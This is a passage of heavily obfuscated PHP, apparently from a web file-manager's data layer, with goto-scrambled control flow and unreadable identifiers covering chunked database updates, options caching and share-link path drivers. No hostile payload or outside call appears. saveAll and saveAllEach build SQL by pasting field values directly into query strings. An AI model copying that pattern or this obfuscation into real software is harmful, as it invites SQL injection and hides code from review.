case $eÒ½à¸òÀØ[311]: if ($B©Âåº»—“[$cÎªø×£ÆŠ] === $eÒ½à¸òÀØ[33]) { unset($B©Âåº»—“[$cÎªø×£ÆŠ]); } break; case $eÒ½à¸òÀØ[312]: $B©Âåº»—“[$cÎªø×£ÆŠ] = $CŞç„½½”Å[1]; default: break; } } } public function saveAll($fêŒœã¦ƒĞ) { goto e½åšŠÈ¶¯; e½åšŠÈ¶¯: $F‘Ê¿¬İÉí =& $_SERVER[îÖ]; $F™’ÜÙë¤¾ = $this->tablePrefix . $this->tableName; $A¢ÕÕÂÚ· = self::SQL_WHERE_IN_CHUNK; goto BÁğÀÚƒ›°; BôÕ’‰¸æ: $this->chunkEventSet(); goto CÑÆ¢º†; BÁğÀÚƒ›°: $fêŒœã¦ƒĞ = is_array($fêŒœã¦ƒĞ) ? $fêŒœã¦ƒĞ : array(); $e®±ê‰ÑÒ = $F‘Ê¿¬İÉí[361]; $e‚µİ‰Ü±ª = 0; goto dÕö®ˆŠ–½; dÕö®ˆŠ–½: $aŒåÎ‘…˜Ù = array(); $dç¼…ŸÊ½ê = count($fêŒœã¦ƒĞ); for ($b¹¬Š„ñ’ = 0; $b¹¬Š„ñ’ < $dç¼…ŸÊ½ê; $b¹¬Š„ñ’++) { $f«²ËÏİ·¸ = $fêŒœã¦ƒĞ[$b¹¬Š„ñ’]; if (!is_array($f«²ËÏİ·¸) || count($f«²ËÏİ·¸) != 4) { continue; } $dàÍ™ó¾Èê = "\125\x50\x44\x41\x54\105\40\x60{$F™’ÜÙë¤¾}\140\40\123\x45\124\40{$f«²ËÏİ·¸[2]}\40\75\40\103\x41\123\x45\40{$f«²ËÏİ·¸[0]}\40\12"; if ($e‚µİ‰Ü±ª == 0) { $e®±ê‰ÑÒ = $dàÍ™ó¾Èê; } $aŒåÎ‘…˜Ù[] = $F‘Ê¿¬İÉí[113] . $f«²ËÏİ·¸[1] . $F‘Ê¿¬İÉí[113]; $e‚µİ‰Ü±ª++; $e®±ê‰ÑÒ .= "\40\x57\x48\105\x4e\x20\47{$f«²ËÏİ·¸[1]}\47\40\x54\x48\105\116\40\x27{$f«²ËÏİ·¸[3]}\x27\40\12"; if ($e‚µİ‰Ü±ª == $A¢ÕÕÂÚ· || $b¹¬Š„ñ’ == $dç¼…ŸÊ½ê - 1) { goto AøˆùÚÛˆ; Bµ¼¿Şà·Ã: $aŒåÎ‘…˜Ù = array(); goto CêÛ–íÏ; AøˆùÚÛˆ: $dÎ…ñƒÌ‰ì = implode($F‘Ê¿¬İÉí[47], $aŒåÎ‘…˜Ù); $e®±ê‰ÑÒ .= "\40\x45\x4e\x44\x20\40\x57\x48\105\122\x45\x20{$f«²ËÏİ·¸[0]}\x20\111\x4e\x20\x28{$dÎ…ñƒÌ‰ì}\51\x20"; $this->execute($e®±ê‰ÑÒ); goto eÖïøÜÁù; eÖïøÜÁù: $e‚µİ‰Ü±ª = 0; $e®±ê‰ÑÒ = $dàÍ™ó¾Èê; $this->chunkEventCheck(count($aŒåÎ‘…˜Ù)); goto Bµ¼¿Şà·Ã; CêÛ–íÏ: } } goto BôÕ’‰¸æ; CÑÆ¢º†: } public function saveAllEach($FçÂç’Ïœ‹) { $dœĞÈ­¸øæ =& $_SERVER[îÖ]; $eñ©¡õòé = $this->tablePrefix . $this->tableName; foreach ($FçÂç’Ïœ‹ as $bëˆ•Å´á„) { if (!is_array($bëˆ•Å´á„) || count($bëˆ•Å´á„) != 4) { continue; } $Bºï«ˆÑÖ = $bëˆ•Å´á„[0] . $dœĞÈ­¸øæ[362] . $bëˆ•Å´á„[1] . $dœĞÈ­¸øæ[113]; $FÙ—¨œ”Ì× = $bëˆ•Å´á„[2] . $dœĞÈ­¸øæ[362] . $bëˆ•Å´á„[3] . $dœĞÈ­¸øæ[113]; $AÒ¨â¿‹¬Ü = "\165\160\144\141\x74\x65\x20{$eñ©¡õòé}\40\163\x65\x74\x20{$FÙ—¨œ”Ì×}\40\167\150\x65\x72\x65\40{$Bºï«ˆÑÖ}\73"; $this->execute($AÒ¨â¿‹¬Ü); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($bà†‹Ü = false, $e†°±¡îÒ = false) { $this->_chunkEvent = $bà†‹Ü; $this->_chunkEventParam = $e†°±¡îÒ; } private function chunkEventCheck($A Ğòö) { if (!$this->_chunkEvent) { return; } $aÅ²î´¼‹÷ = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $aÅ²î´¼‹÷[$_SERVER[îÖ][363]] = $A Ğòö; Hook::trigger($this->_chunkEvent, $aÅ²î´¼‹÷); } public function addAll($E„™£Š¬ªÓ, $aºÜ“ªè§‡ = array(), $d£–±—®«ã = false) { goto c‚ÔœˆÊÌÅ; aó¼ìÖ£¹”: if (empty($E„™£Š¬ªÓ)) { $this->error = think_lang($D«É…ÏäÖ[259]); return !1; } $aºÜ“ªè§‡ = $this->_parseOptions($aºÜ“ªè§‡); foreach ($E„™£Š¬ªÓ as $c–‚ÒÓŞ => $Fõá£Ô¥ÛÉ) { $E„™£Š¬ªÓ[$c–‚ÒÓŞ] = $this->_facade($Fõá£Ô¥ÛÉ); $this->_beforeInsert($E„™£Š¬ªÓ[$c–‚ÒÓŞ], $aºÜ“ªè§‡); } goto c¬íºØ½Ğ³; c‚ÔœˆÊÌÅ: $D«É…ÏäÖ =& $_SERVER[îÖ]; ignore_timeout(); $b‹‚…ŠÈ‹‡ = self::SQL_WHERE_IN_CHUNK; goto aó¼ìÖ£¹”; c¬íºØ½Ğ³: if (method_exists($this->db, $D«É…ÏäÖ[260])) { for ($Dé®ôÅá´ = 0; $Dé®ôÅá´ < count($E„™£Š¬ªÓ); $Dé®ôÅá´ += $b‹‚…ŠÈ‹‡) { $Bù›‡•ÎÀæ = array_slice($E„™£Š¬ªÓ, $Dé®ôÅá´, $b‹‚…ŠÈ‹‡); if (!is_array($Bù›‡•ÎÀæ) || count($Bù›‡•ÎÀæ) == 0) { break; } $CİÕÈ˜©Ìß = $this->db->insertAll($Bù›‡•ÎÀæ, $aºÜ“ªè§‡, $d£–±—®«ã); $this->chunkEventCheck(count($Bù›‡•ÎÀæ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($E„™£Š¬ªÓ as $c–‚ÒÓŞ => $Fõá£Ô¥ÛÉ) { $CİÕÈ˜©Ìß = $this->db->insert($Fõá£Ô¥ÛÉ, $aºÜ“ªè§‡, $d£–±—®«ã); } $this->commit(); } if (!1 !== $CİÕÈ˜©Ìß) { $CÎìƒŒ’‚¬ = $this->getLastInsID(); if ($CÎìƒŒ’‚¬) { return $CÎìƒŒ’‚¬; } } return $CİÕÈ˜©Ìß; goto EˆÙ‘ƒ ¹ğ; EˆÙ‘ƒ ¹ğ: } public function save($D¶šºïŒÏó = '', $a÷¿¡‡ë÷Ş = array()) { goto A£‹ïÛ¬ŠÜ; bÎˆÛ•ğÒ‰: $a“‡èÆˆæ = $a§øÍ†ÈÉ…[$EÓ’äÕåò¥[263]][$Dö£„¬˜’¯][1]; $a“‡èÆˆæ = is_array($a“‡èÆˆæ) ? $a“‡èÆˆæ : array(); $EÏ¨ôóŒåÛ = count($a“‡èÆˆæ); goto B¢×¤àÀñ; B¢×¤àÀñ: for ($eÇÆÙÄ‰Ğ‚ = 0; $eÇÆÙÄ‰Ğ‚ < $EÏ¨ôóŒåÛ; $eÇÆÙÄ‰Ğ‚ += $e‰¶Ïèõ«Ù) { $cµ¡ÄÑŸÆ¯ = array_slice($a“‡èÆˆæ, $eÇÆÙÄ‰Ğ‚, $e‰¶Ïèõ«Ù); if (!is_array($cµ¡ÄÑŸÆ¯) || count($cµ¡ÄÑŸÆ¯) == 0) { break; } $a§øÍ†ÈÉ…[$EÓ’äÕåò¥[263]][$Dö£„¬˜’¯][1] = $cµ¡ÄÑŸÆ¯; $this->optionsValue($a§øÍ†ÈÉ…); $bç„‰æ—  += parent::save($D¶šºïŒÏó, $a÷¿¡‡ë÷Ş); $this->chunkEventCheck(count($cµ¡ÄÑŸÆ¯)); } $this->chunkEventSet(); return $bç„‰æ— ; goto AÛšèƒÜ«ï; C‡¾ãß²¥: $Dö£„¬˜’¯ = $this->findWhereField($a§øÍ†ÈÉ…); if (!$Dö£„¬˜’¯) { return parent::save($D¶šºïŒÏó, $a÷¿¡‡ë÷Ş); } $bç„‰æ—  = 0; goto bÎˆÛ•ğÒ‰; A£‹ïÛ¬ŠÜ: $EÓ’äÕåò¥ =& $_SERVER[îÖ]; $e‰¶Ïèõ«Ù = self::SQL_WHERE_IN_CHUNK; $a§øÍ†ÈÉ… = $this->optionsValue(); goto C‡¾ãß²¥; AÛšèƒÜ«ï: } public function add($F¼¹Ö µÑ¯ = '', $E®óåêÇ› = array(), $fƒ„ŠæÆˆ = false) { if ($this->addTaskStatus && is_array($F¼¹Ö µÑ¯)) { $this->addTaskData[] = $F¼¹Ö µÑ¯; return; } return parent::add($F¼¹Ö µÑ¯, $E®óåêÇ›, $fƒ„ŠæÆˆ); } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($Bš£Íö®¦ö = array()) { goto BÇ¡Ÿœ×®ì; dæ‡¯¤šŒ´: return $A”ñòè†‡; goto F®„øæÁï×; Dğó…›Å†¨: $D©©Æò©’ = is_array($D©©Æò©’) ? $D©©Æò©’ : array(); $A”ñòè†‡ = null; for ($còÕ–Ö¾Ÿ = 0; $còÕ–Ö¾Ÿ < count($D©©Æò©’); $còÕ–Ö¾Ÿ += $fÇš‚áìÙ§) { $cèÍ§îô„ = array_slice($D©©Æò©’, $còÕ–Ö¾Ÿ, $fÇš‚áìÙ§); if (!is_array($cèÍ§îô„) || count($cèÍ§îô„) == 0) { break; } $EÚÂ¹¯ÕÁ[$dÒ…İ´™ù›[263]][$Eê°æ‘¬íÜ][1] = $cèÍ§îô„; $this->optionsValue($EÚÂ¹¯ÕÁ); $a‰áËóÉ¹á = parent::select($Bš£Íö®¦ö); if (!$a‰áËóÉ¹á) { continue; } if (is_null($A”ñòè†‡)) { $A”ñòè†‡ = array(); } $A”ñòè†‡ = array_merge($A”ñòè†‡, $a‰áËóÉ¹á); } goto dæ‡¯¤šŒ´; FÇ å–…ç: $Eê°æ‘¬íÜ = $this->findWhereField($EÚÂ¹¯ÕÁ); if (!$Eê°æ‘¬íÜ || isset($EÚÂ¹¯ÕÁ[$dÒ…İ´™ù›[280]]) || isset($EÚÂ¹¯ÕÁ[$dÒ…İ´™ù›[340]])) { return parent::select($Bš£Íö®¦ö); } $D©©Æò©’ = $EÚÂ¹¯ÕÁ[$dÒ…İ´™ù›[263]][$Eê°æ‘¬íÜ][1]; goto Dğó…›Å†¨; BÇ¡Ÿœ×®ì: $dÒ…İ´™ù› =& $_SERVER[îÖ]; $fÇš‚áìÙ§ = self::SQL_WHERE_IN_CHUNK; $EÚÂ¹¯ÕÁ = $this->optionsValue(); goto FÇ å–…ç; F®„øæÁï×: } public function delete($fÄó¼á¹ç½ = array()) { goto CªÀ²Ô½¦Ş; CªÀ²Ô½¦Ş: $dè‰®ÛæÏ =& $_SERVER[îÖ]; $b˜Áµæ™­À = self::SQL_WHERE_IN_CHUNK; $A‚ÆÖ§¨ïä = $this->optionsValue(); goto c”›¤Ã˜šø; c”›¤Ã˜šø: $f»ÂÎù„é = $this->findWhereField($A‚ÆÖ§¨ïä); if (!$f»ÂÎù„é) { return parent::delete($fÄó¼á¹ç½); } $c‡è½Øò…¦ = 0; goto d²›ÇŞ°µ¹; d•¤™ÜãÁá: return $c‡è½Øò…¦; goto CŠäº¦Òµ; d²›ÇŞ°µ¹: $c‚¶Äç±Ã = $A‚ÆÖ§¨ïä[$dè‰®ÛæÏ[263]][$f»ÂÎù„é][1]; $c‚¶Äç±Ã = is_array($c‚¶Äç±Ã) ? $c‚¶Äç±Ã : array(); for ($C÷Çßàá = 0; $C÷Çßàá < count($c‚¶Äç±Ã); $C÷Çßàá += $b˜Áµæ™­À) { $F¶–Çß™Â£ = array_slice($c‚¶Äç±Ã, $C÷Çßàá, $b˜Áµæ™­À); if (!is_array($F¶–Çß™Â£) || count($F¶–Çß™Â£) == 0) { break; } $A‚ÆÖ§¨ïä[$dè‰®ÛæÏ[263]][$f»ÂÎù„é][1] = $F¶–Çß™Â£; $this->optionsValue($A‚ÆÖ§¨ïä); $c‡è½Øò…¦ += parent::delete($fÄó¼á¹ç½); } goto d•¤™ÜãÁá; CŠäº¦Òµ: } private function findWhereField($fÕÊ¶ìßá) { $Dï†»æ´äÉ =& $_SERVER[îÖ]; $fŸØ‘èÛÅİ = self::SQL_WHERE_IN_CHUNK; if (!is_array($fÕÊ¶ìßá) || !is_array($fÕÊ¶ìßá[$Dï†»æ´äÉ[263]])) { return !1; } foreach ($fÕÊ¶ìßá[$Dï†»æ´äÉ[263]] as $fä¦ƒ·ƒ» => $dà©ò±Şñ•) { if (is_array($dà©ò±Şñ•) && isset($dà©ò±Şñ•[0]) && is_string($dà©ò±Şñ•[0]) && strtolower($dà©ò±Şñ•[0]) == $Dï†»æ´äÉ[7] && is_array($dà©ò±Şñ•[1]) && count($dà©ò±Şñ•[1]) > $fŸØ‘èÛÅİ) { ignore_timeout(); return $fä¦ƒ·ƒ»; } } return !1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\x65\x6d\x4f\x70\164\x69\x6f\156"; public $field = array(); public function listData($a¼ä·¼Ÿê– = false, $D—éºÉñƒ  = "\155\x6f\144\151\146\x79\124\x69\155\x65", $BÉš£õÈÄæ = false) { $DÁŠ±õãÂ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$DÁŠ±õãÂ) { return $a¼ä·¼Ÿê– ? null : array(); } if (!$a¼ä·¼Ÿê–) { $DÁŠ±õãÂ = array_filter(array_values($DÁŠ±õãÂ)); return array_sort_by($DÁŠ±õãÂ, $D—éºÉñƒ , $BÉš£õÈÄæ); } return $DÁŠ±õãÂ[$_SERVER[îÖ][364] . $a¼ä·¼Ÿê–]; } public function insert($e‡ãù¼Õ˜Ô) { goto a¶áÉã–¢†; cÇÆô‰ÆÅ¬: return $D¤Õâ”°±ˆ; goto Aœé‰ä‚å; Aˆ•’ÀíÚ: $D¤Õâ”°±ˆ = $D¤Õâ”°±ˆ ? $D¤Õâ”°±ˆ : 0; $e‡ãù¼Õ˜Ô[$e„í×‘å‰¿[367]] = ++$D¤Õâ”°±ˆ; $e‡ãù¼Õ˜Ô[$e„í×‘å‰¿[187]] = time(); goto dÀ’¹†¢ˆ; dÀ’¹†¢ˆ: $e‡ãù¼Õ˜Ô[$e„í×‘å‰¿[107]] = time(); Model($this->modelType)->set($e„í×‘å‰¿[365], $D¤Õâ”°±ˆ, $this->optionType . $e„í×‘å‰¿[366]); Model($this->modelType)->set($e„í×‘å‰¿[364] . $D¤Õâ”°±ˆ, $e‡ãù¼Õ˜Ô, $this->optionType); goto cÇÆô‰ÆÅ¬; a¶áÉã–¢†: $e„í×‘å‰¿ =& $_SERVER[îÖ]; $e‡ãù¼Õ˜Ô = array_field_key($e‡ãù¼Õ˜Ô, $this->field); $D¤Õâ”°±ˆ = Model($this->modelType)->get($e„í×‘å‰¿[365], $this->optionType . $e„í×‘å‰¿[366]); goto Aˆ•’ÀíÚ; Aœé‰ä‚å: } public function update($A‚Í²—çŞò, $AÒª²„‘´) { goto Bİ¸ÖÓ¼Ê„; Cóª»ˆêÙÆ: return Model($this->modelType)->set($EöÇµÕ¾“[364] . $A‚Í²—çŞò, $AÒª²„‘´, $this->optionType); goto CíĞ…Ãğ¡; Bİ¸ÖÓ¼Ê„: $EöÇµÕ¾“ =& $_SERVER[îÖ]; $AÒª²„‘´ = array_field_key($AÒª²„‘´, $this->field); $C–Ç¸ÍÕ¢‘ = $this->listData($A‚Í²—çŞò); goto D³ŒŸÜá­Ó; D³ŒŸÜá­Ó: if (!$C–Ç¸ÍÕ¢‘) { return !1; } $AÒª²„‘´ = array_merge($C–Ç¸ÍÕ¢‘, $AÒª²„‘´); $AÒª²„‘´[$EöÇµÕ¾“[107]] = time(); goto Cóª»ˆêÙÆ; CíĞ…Ãğ¡: } public function remove($cæùØ™¢£ñ) { return Model($this->modelType)->remove($_SERVER[îÖ][364] . $cæùØ™¢£ñ, $this->optionType); } public function clear() { $f¡›Á‡öà  =& $_SERVER[îÖ]; Model($this->modelType)->remove($f¡›Á‡öà [365], $this->optionType . $f¡›Á‡öà [366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($D·ñÈ³¼, $aÍøùÅØ·) { if (!$aÍøùÅØ·) { return !1; } $C¼–”‰ÇÅ = $this->listData(); $C¼–”‰ÇÅ = array_to_keyvalue($C¼–”‰ÇÅ, $D·ñÈ³¼); return isset($C¼–”‰ÇÅ[$aÍøùÅØ·]) ? $C¼–”‰ÇÅ[$aÍøùÅØ·] : !1; } public function findByName($a‚„ÔòóÁ) { return $this->findByKey($_SERVER[îÖ][28], $a‚„ÔòóÁ); } protected function resetData($a…À‘ºì) { $Eê©µ•¶áº =& $_SERVER[îÖ]; $a…À‘ºì = is_array($a…À‘ºì) ? $a…À‘ºì : array(); $Bø¯âßÔ„¬ = array(); for ($a³½‡«Ü…Ú = 0; $a³½‡«Ü…Ú < count($a…À‘ºì); $a³½‡«Ü…Ú++) { $Bø¯âßÔ„¬[$Eê©µ•¶áº[364] . $a…À‘ºì[$a³½‡«Ü…Ú][$Eê©µ•¶áº[367]]] = $a…À‘ºì[$a³½‡«Ü…Ú]; } return Model($this->modelType)->set($Bø¯âßÔ„¬, !1, $this->optionType); } private function getAutoName($CÚäŸ©˜§‡) { $føËí¬È†å = array_to_keyvalue($this->listData(), $_SERVER[îÖ][28]); if (!$føËí¬È†å || !isset($føËí¬È†å[$CÚäŸ©˜§‡])) { return $CÚäŸ©˜§‡; } for ($EèéÅññØ = 1; $EèéÅññØ < count($føËí¬È†å); $EèéÅññØ++) { $F×Ì”´Ñªé = $CÚäŸ©˜§‡ . "\50{$EèéÅññØ}\51"; if (!isset($føËí¬È†å[$F×Ì”´Ñªé])) { return $F×Ì”´Ñªé; } } return $F×Ì”´Ñªé; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($Bë¶ÓÍ†ŸÎ = false, $e¶ÍÛÁ•¥ = '', $A³•¢‹Éæê = false) { goto c¢¬˜‘êÂÆ; d‰Œñµ: $E‡Î„”ø¾¿ = is_array($E‡Î„”ø¾¿) ? $E‡Î„”ø¾¿ : array(); if (is_array($c×‚ç• ¬‡)) { $c×‚ç• ¬‡ = array_merge($E‡Î„”ø¾¿, $c×‚ç• ¬‡); return $Bë¶ÓÍ†ŸÎ ? isset($c×‚ç• ¬‡[$Bë¶ÓÍ†ŸÎ]) ? $c×‚ç• ¬‡[$Bë¶ÓÍ†ŸÎ] : null : $c×‚ç• ¬‡; } $C¯ğÉ†²­Œ = $this->filterWhere(array($DÜáğœ¡¿²[29] => $e¶ÍÛÁ•¥)); goto b¹‚ÙµÙ‡×; c¢¬˜‘êÂÆ: $DÜáğœ¡¿² =& $_SERVER[îÖ]; $c×‚ç• ¬‡ = $this->cacheGet($e¶ÍÛÁ•¥); $E‡Î„”ø¾¿ = $this->optionDefault($e¶ÍÛÁ•¥); goto d‰Œñµ; b¹‚ÙµÙ‡×: $c×‚ç• ¬‡ = $this->where($C¯ğÉ†²­Œ)->select(); $c×‚ç• ¬‡ = array_to_keyvalue($c×‚ç• ¬‡, $DÜáğœ¡¿²[89], $DÜáğœ¡¿²[359]); foreach ($c×‚ç• ¬‡ as $FƒàÙãÆŸ† => $d˜ê‹¸Ÿ¦ê) { if ($A³•¢‹Éæê || in_array($FƒàÙãÆŸ†, $this->jsonField)) { $c×‚ç• ¬‡[$FƒàÙãÆŸ†] = json_decode($d˜ê‹¸Ÿ¦ê, !0); } } goto aµ©Ş”¶»Ç; aµ©Ş”¶»Ç: $this->cacheSet($e¶ÍÛÁ•¥, $c×‚ç• ¬‡); $c×‚ç• ¬‡ = array_merge($E‡Î„”ø¾¿, $c×‚ç• ¬‡); return $Bë¶ÓÍ†ŸÎ ? $c×‚ç• ¬‡[$Bë¶ÓÍ†ŸÎ] : $c×‚ç• ¬‡; goto c×„ÇŞŠè; c×„ÇŞŠè: } public function set($dĞâ‡Ó Ä¦, $e²¼ ˜½ª‡ = false, $eµ‰ÅôÚËè = '') { goto aö±¡¤ƒÉå; DïÏ¦õÌê¦: $aĞãªˆ…Ş™ = is_array($dĞâ‡Ó Ä¦) ? $dĞâ‡Ó Ä¦ : array($dĞâ‡Ó Ä¦ => $e²¼ ˜½ª‡); foreach ($aĞãªˆ…Ş™ as $Fƒ”õ¤Í„ => $E×²ÚÄ†Ñ­) { if (is_array($E×²ÚÄ†Ñ­)) { $E×²ÚÄ†Ñ­ = json_encode_force($E×²ÚÄ†Ñ­); } $this->checkLength($E×²ÚÄ†Ñ­, !1, $this->tableName . $fßÆÃˆ‡‘[4] . $dĞâ‡Ó Ä¦); $E×²ÚÄ†Ñ­ = self::textEncode($E×²ÚÄ†Ñ­); $aĞãªˆ…Ş™ = array($fßÆÃˆ‡‘[29] => $eµ‰ÅôÚËè, $fßÆÃˆ‡‘[89] => $Fƒ”õ¤Í„, $fßÆÃˆ‡‘[359] => $E×²ÚÄ†Ñ­); $CÔøŠƒë’‰[] = $this->filterWhere($aĞãªˆ…Ş™); } if (!$CÔøŠƒë’‰) { return !0; } goto BáŸ»í‰ˆ; aö±¡¤ƒÉå: $fßÆÃˆ‡‘ =& $_SERVER[îÖ]; $this->cacheRemove($eµ‰ÅôÚËè); $CÔøŠƒë’‰ = array(); goto DïÏ¦õÌê¦; BáŸ»í‰ˆ: return $this->addAll($CÔøŠƒë’‰, array(), !0); goto cÇÛÔ¶ƒ; cÇÛÔ¶ƒ: } protected function optionDefault($EÈ«ˆÜ¿  = '') { return !1; } public function setDeep($AÏõ±ª´¢¢, $eÙ÷²²È® = false, $EÊÑÒ«œ = '') { $E‘¿«àÃİ = explode($_SERVER[îÖ][91], $AÏõ±ª´¢¢); $BÔäË¡öÚ = $this->get(); array_set_value($BÔäË¡öÚ, $AÏõ±ª´¢¢, $eÙ÷²²È®); $this->set($E‘¿«àÃİ[0], $BÔäË¡öÚ[$E‘¿«àÃİ[0]], $EÊÑÒ«œ); } public function remove($a›§ğìÂğŞ, $Cê÷ğ ´ = '') { $fŞ¼ÑÖõ²ó =& $_SERVER[îÖ]; $this->cacheRemove($Cê÷ğ ´); $aòã­å„Ô = $this->filterWhere(array($fŞ¼ÑÖõ²ó[89] => $a›§ğìÂğŞ, $fŞ¼ÑÖõ²ó[29] => $Cê÷ğ ´)); if (is_null($a›§ğìÂğŞ)) { unset($aòã­å„Ô[$fŞ¼ÑÖõ²ó[89]]); } return $this->where($aòã­å„Ô)->delete(); } public function cacheSet($e‘‘œ±«Åã, $fß³ããº‡ƒ = false) { return Cache::set($this->cacheKey($e‘‘œ±«Åã), $fß³ããº‡ƒ); } public function cacheGet($DÀ•Ëˆè¥ç) { return Cache::get($this->cacheKey($DÀ•Ëˆè¥ç)); } public function cacheRemove($CˆíÙçáêŒ) { return Cache::remove($this->cacheKey($CˆíÙçáêŒ)); } protected function filterWhere($Eİ¬ÌÅ¾È‰) { return $Eİ¬ÌÅ¾È‰; } protected function cacheKey($d—×£¯Ã‰¯) { return $d—×£¯Ã‰¯; } } goto Dìœ…Â‡Æ; AÄ‹¿ˆ»œÏ: class PathDriverDbShareLink extends PathDriverDB { public function __construct($cÛ‹Ÿ°àÚ†) { $this->pathParse = $cÛ‹Ÿ°àÚ†; $this->model = Model($_SERVER[îÖ][1111]); } protected function infoParse($eÃÚİæ›Ğ, $cÌ¦É¢••¨ = false, $D‹âç—´Ëæ = false) { $AÌ¦¶Ù”®Û =& $_SERVER[îÖ]; return Action($AÌ¦¶Ù”®Û[1012])->sharePathInfo($this->pathParse[$AÌ¦¶Ù”®Û[75]], !0); } public function listPath($fğåù¤Ñ–¨, $EğöİÆŞ¯¢ = false) { $EØ­µÇÉœ =& $_SERVER[îÖ]; $CÀŠøàßÃ = parent::listPath($fğåù¤Ñ–¨, $EğöİÆŞ¯¢); foreach ($CÀŠøàßÃ as $b¨‡óôõ => $F´Éê„ÖÌ•) { if (!in_array($b¨‡óôõ, array($EØ­µÇÉœ[73], $EØ­µÇÉœ[74]))) { continue; } foreach ($F´Éê„ÖÌ• as $dæ»òÔß³ => $aóã‚ÍºÒ‚) { $CÀŠøàßÃ[$b¨‡óôõ][$dæ»òÔß³] = Action($EØ­µÇÉœ[1012])->shareItemInfo($aóã‚ÍºÒ‚); } } return $CÀŠøàßÃ; } public function listAll($BÍù÷®‚’Ÿ) { $D¶’½¥Í‹ =& $_SERVER[îÖ]; $CÉÂ•‹¾ƒØ = IO::info($this->pathParse[$D¶’½¥Í‹[75]]); if (!$CÉÂ•‹¾ƒØ) { return array(); } $bÌƒ‹…Ê† = $this->model->listAll($BÍù÷®‚’Ÿ); foreach ($bÌƒ‹…Ê† as &$f½„æ‰Š) { $f½„æ‰Š[$D¶’½¥Í‹[391]] = Action($D¶’½¥Í‹[1012])->shareItemInfo($f½„æ‰Š[$D¶’½¥Í‹[391]]); } return $bÌƒ‹…Ê†; } } class PathDriverDriverShareItem { public function __construct($bÓ¾à²â”œ) { $this->pathParse = $bÓ¾à²â”œ; } public function __call($FÂÏŠæÔæÒ, $AÁĞš·¥Şš) { $b‘¿â©ˆ¼Ï =& $_SERVER[îÖ]; if (method_exists($this, $FÂÏŠæÔæÒ)) { return; } $céÅ»¦Ö¬Ñ = call_user_func_array(array($b‘¿â©ˆ¼Ï[1119], $FÂÏŠæÔæÒ), $AÁĞš·¥Şš); $aâíôëË«ä = array($b‘¿â©ˆ¼Ï[1120], $b‘¿â©ˆ¼Ï[1121], $b‘¿â©ˆ¼Ï[1122], $b‘¿â©ˆ¼Ï[1123], $b‘¿â©ˆ¼Ï[490], $b‘¿â©ˆ¼Ï[492], $b‘¿â©ˆ¼Ï[1124], $b‘¿â©ˆ¼Ï[103], $b‘¿â©ˆ¼Ï[1125], $b‘¿â©ˆ¼Ï[1126]); if (in_array($FÂÏŠæÔæÒ, $aâíôëË«ä)) { $céÅ»¦Ö¬Ñ = $this->getPathOuter($céÅ»¦Ö¬Ñ); } return $céÅ»¦Ö¬Ñ; } public function copy($AèÆ‹©‹Ğ, $E¥åÏŞÙ¬È, $b˜˜–Åî’ê = false) { return $this->copyMove($AèÆ‹©‹Ğ, $E¥åÏŞÙ¬È, $b˜˜–Åî’ê, $_SERVER[îÖ][490]); } public function move($dÁŒ¸·ó, $BìŒñ¡¨, $D®¸¦ÉÆøÈ = false) { return $this->copyMove($dÁŒ¸·ó, $BìŒñ¡¨, $D®¸¦ÉÆøÈ, $_SERVER[îÖ][492]); } private function copyMove($dÉ×Î´Ö†, $d¬Îƒäôî, $CÕƒĞùó‚, $CŞàÓ¡œÏœ) { goto BÙº†Å†÷‚; cÜ›èÖì‰ë: return $D¤ôƒÉ‘¤–; goto Fêì¢Ÿ¡ÙÅ; A‘°ñè”øç: if ($e¹ø™òÂâĞ->pathParse[$F‰×¨±¶ÁÓ[992]]) { $d¬Îƒäôî = $e¹ø™òÂâĞ->pathParse[$F‰×¨±¶ÁÓ[992]]; } else { $d¬Îƒäôî = $c¤îê®Öõ; } $D¤ôƒÉ‘¤– = IO::copyMove($dÉ×Î´Ö†, $d¬Îƒäôî, $CÕƒĞùó‚, $CŞàÓ¡œÏœ); $D¤ôƒÉ‘¤– = $this->getPathOuter($D¤ôƒÉ‘¤–); goto cÜ›èÖì‰ë; BÙº†Å†÷‚: $F‰×¨±¶ÁÓ =& $_SERVER[îÖ]; $c¤îê®Öõ = $d¬Îƒäôî; $e¹ø™òÂâĞ = IO::driverMake($d¬Îƒäôî); goto A‘°ñè”øç; Fêì¢Ÿ¡ÙÅ: } public function pathFather($fµ„õîã à) { return get_path_father($this->pathParse[$_SERVER[îÖ][75]]); } public function iconvSystem($fêŒÅ‹å÷¹) { return $fêŒÅ‹å÷¹; } protected function infoParse($E‡¾Ú­²×É, $Bè«ÈçñÉË = false) { $cÑèŸ‹ìƒµ =& $_SERVER[îÖ]; $C‰’”•„“ = $this->pathParse[$cÑèŸ‹ìƒµ[439]][$cÑèŸ‹ìƒµ[1013]] . $this->pathParse[$cÑèŸ‹ìƒµ[1006]]; if ($Bè«ÈçñÉË) { $aÓÌÂƒ›Á² = IO::infoWithChildren($C‰’”•„“); } else { $aÓÌÂƒ›Á² = IO::info($C‰’”•„“); } $CÁİ§‡ïŠ› = $this->pathParse[$cÑèŸ‹ìƒµ[439]]; return Action($cÑèŸ‹ìƒµ[1118])->_shareItemeParse($aÓÌÂƒ›Á², $CÁİ§‡ïŠ›); } public function listAll($Aª”ÂÄ½ÑØ) { $B§ˆ¶ß÷ˆï =& $_SERVER[îÖ]; $D—˜ÁöŒä› = IO::listAll($Aª”ÂÄ½ÑØ); $DŞÓÈø¬Ô‚ = $this->pathParse[$B§ˆ¶ß÷ˆï[439]]; foreach ($D—˜ÁöŒä› as &$A½î†©Ã®) { check_abort(); $A½î†©Ã® = array_merge(IO::info($A½î†©Ã®[$B§ˆ¶ß÷ˆï[75]]), $A½î†©Ã®); $A½î†©Ã®[$B§ˆ¶ß÷ˆï[391]] = Action($B§ˆ¶ß÷ˆï[1118])->_shareItemeParse($A½î†©Ã®, $DŞÓÈø¬Ô‚); } return $D—˜ÁöŒä›; } public function 